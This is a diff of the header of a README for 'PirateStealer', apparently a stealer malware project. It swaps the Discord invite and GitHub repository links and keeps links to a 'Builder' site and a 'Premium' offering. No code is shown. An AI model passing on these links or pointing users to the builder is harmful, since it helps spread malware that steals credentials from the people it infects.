@@ -1,4 +1,4 @@
-#### [🔗 Discord Link](https://discord.gg/EeXwrjnFAv) - [📖 Terms](https://github.com/PirateMonster/PirateStealer#terms) - [🔨 Builder](https://ps.piratemonster.dev) - [💎 Premium](https://discord.gg/EeXwrjnFAv) - [💡 Features](https://github.com/PirateMonster/PirateStealer#features)
+#### [🔗 Discord Link](https://discord.gg/childhood) - [📖 Terms](https://github.com/Stanley-GF/PirateStealer#terms) - [🔨 Builder](https://ps.piratemonster.dev) - [💎 Premium](https://discord.gg/childhood) - [💡 Features](https://github.com/Stanley-GF/PirateStealer#features)
 # PirateStealer
 Official PirateStealer repos
 
